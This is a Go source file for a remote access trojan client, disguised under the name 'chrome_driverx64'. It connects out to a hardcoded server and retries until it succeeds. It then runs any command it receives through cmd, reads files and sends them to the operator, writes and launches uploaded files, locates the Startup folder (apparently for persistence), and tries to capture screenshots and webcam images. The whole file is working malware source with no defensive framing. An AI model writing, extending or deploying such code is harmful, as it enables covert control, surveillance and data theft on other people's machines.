package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

type Client struct {
	Name       string
	ServerIP   string
	Port       int
	Connection net.Conn
	DataPath   string
	System     string
}

func NewClient(name, serverIP string, port int) *Client {
	return &Client{
		Name:     name,
		ServerIP: serverIP,
		Port:     port,
		DataPath: "data.txt",
		System:   runtime.GOOS,
	}
}

func (c *Client) CheckFile() {
	if _, err := os.Stat(c.DataPath); err == nil {
		data, err := os.ReadFile(c.DataPath)
		if err == nil {
			parts := strings.Split(string(data), "-")
			if len(parts) == 3 {
				c.Name = parts[0]
				c.ServerIP = parts[1]
				c.Port = atoi(parts[2])
			}
		}
	}
}

func (c *Client) Connect() {
	for {
		c.ConnectToServer()
		if c.Connection != nil {
			c.Send(c.Name)
			break
		}
		time.Sleep(1 * time.Second)
	}
}

func (c *Client) ConnectToServer() {
	address := fmt.Sprintf("%s:%d", c.ServerIP, c.Port)
	conn, err := net.Dial("tcp", address)
	if err != nil {
		c.Connection = nil
		return
	}
	c.Connection = conn
}

func (c *Client) Send(data string) {
	_, err := c.Connection.Write([]byte(data))
	if err != nil {
		fmt.Println("Error sending data to the server:", err)
	}
}

func (c *Client) HandleCommands() {
	for {
		command, err := bufio.NewReader(c.Connection).ReadString('\n')
		if err != nil {
			fmt.Println("Error reading command:", err)
			break
		}

		command = strings.TrimSpace(command)

		if command == "check" {
			c.Send("connection established\n")
		} else if command == "get name" {
			c.Send(c.Name + "\n")
		} else if command == "path mode" {
			c.Send(getCurrentPath() + "\n")
		} else if command == "startup path" {
			startupPath := getStartupPath()
			c.Send(startupPath + "\n")
		} else if strings.HasPrefix(command, "cd ") {
			path := strings.TrimSpace(command[3:])
			err := os.Chdir(path)
			if err != nil {
				c.Send(err.Error() + "\n")
			} else {
				c.Send(getCurrentPath() + "\n")
			}
		} else if command == "dir" {
			c.sendOutput("dir")
		} else if strings.HasPrefix(command, "web ") {
			url := strings.TrimSpace(command[4:])
			openWebBrowser(url)
		} else if command == "screenshot" {
			c.sendScreenshot()
		} else if command == "webcam" {
			c.sendWebcamShot()
		} else if strings.HasPrefix(command, "read ") {
			fileName := strings.TrimSpace(command[5:])
			c.readFile(fileName)
		} else if strings.HasPrefix(command, "send ") {
			fileName := strings.TrimSpace(command[5:])
			c.receiveFile(fileName)
		} else if strings.HasPrefix(command, "start ") {
			fileName := strings.TrimSpace(command[6:])
			c.startFile(fileName)
		} else if command == "close" || command == "reset" {
			c.Connection.Close()
			break
		} else {
			c.sendOutput(command)
		}
	}
}

func (c *Client) sendOutput(command string) {
	cmd := exec.Command("cmd", "/C", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		c.Send(err.Error() + "\n")
	} else {
		c.Send(string(output) + "\n")
	}
}

func (c *Client) sendScreenshot() {
	if c.System != "linux" {
		screenshotName := "screenshot.jpg"
		cmd := exec.Command("Powershell", "-Command", "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('%{PRTSC}')")
		err := cmd.Run()
		if err != nil {
			c.Send("Failed to capture screenshot: " + err.Error() + "\n")
			return
		}

		data, err := os.ReadFile(screenshotName)
		if err != nil {
			c.Send("Failed to read screenshot file: " + err.Error() + "\n")
			return
		}

		c.Send(string(data))
		c.Send("end\n")
		err = os.Remove(screenshotName)
		if err != nil {
			c.Send("Failed to remove screenshot file: " + err.Error() + "\n")
		}
	} else {
		c.Send("error\n")
	}
}

func (c *Client) sendWebcamShot() {
	if c.System != "linux" {
		cmd := exec.Command("webcam_shot.pyw")
		err := cmd.Start()
		if err != nil {
			c.Send("Failed to start webcam shot: " + err.Error() + "\n")
		} else {
			c.Send("Taking webcam shot.\n")
		}
	} else {
		c.Send("File to take webcam shots doesn't exist.\n")
	}
}

func (c *Client) readFile(fileName string) {
	data, err := os.ReadFile(fileName)
	if err != nil {
		c.Send("error\n")
	} else {
		c.Send("ok\n")
		c.Send(string(data))
		c.Send("end\n")
	}
}

func (c *Client) receiveFile(fileName string) {
	fileData := []byte{}
	buffer := make([]byte, 1024)
	for {
		n, err := c.Connection.Read(buffer)
		if err != nil {
			c.Send("Error receiving file data: " + err.Error() + "\n")
			return
		}
		fileData = append(fileData, buffer[:n]...)
		if strings.HasSuffix(string(fileData), "end") {
			break
		}
	}
	err := os.WriteFile(fileName, fileData[:len(fileData)-3], 0666)
	if err != nil {
		c.Send("Error writing received file: " + err.Error() + "\n")
	} else {
		c.Send("File has been written.\n")
	}
}

func (c *Client) startFile(fileName string) {
	if _, err := os.Stat(fileName); err == nil && len(fileName) > 0 {
		cmd := exec.Command("cmd", "/C", fileName)
		err := cmd.Start()
		if err != nil {
			c.Send("Error starting file: " + err.Error() + "\n")
		} else {
			c.Send("File has been opened.\n")
		}
	} else {
		c.Send("File doesn't exist.\n")

	}
}

func main() {
	name := "chrome_driverx64"
	serverIP := "192.168.1.102"
	port := 6000

	client := NewClient(name, serverIP, port)
	client.CheckFile()
	client.Connect()

	go client.HandleCommands()

	for {
		time.Sleep(1 * time.Second)
	}
}

func getCurrentPath() string {
	path, err := os.Getwd()
	if err != nil {
		return ""
	}
	return path
}

func getStartupPath() string {
	if runtime.GOOS == "windows" {
		username := os.Getenv("USERPROFILE")
		startupPath := fmt.Sprintf("%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", username)
		if _, err := os.Stat(startupPath); err == nil {
			err := os.Chdir(startupPath)
			if err != nil {
				return getCurrentPath()
			}
			return getCurrentPath()
		}
	}
	return getCurrentPath()
}

func openWebBrowser(url string) {
	err := exec.Command("cmd", "/C", "start", url).Run()
	if err != nil {
		fmt.Println("Error opening web browser:", err)
	}
}

func atoi(s string) int {
	i, err := strconv.Atoi(s)
	if err != nil {
		return 0
	}
	return i
}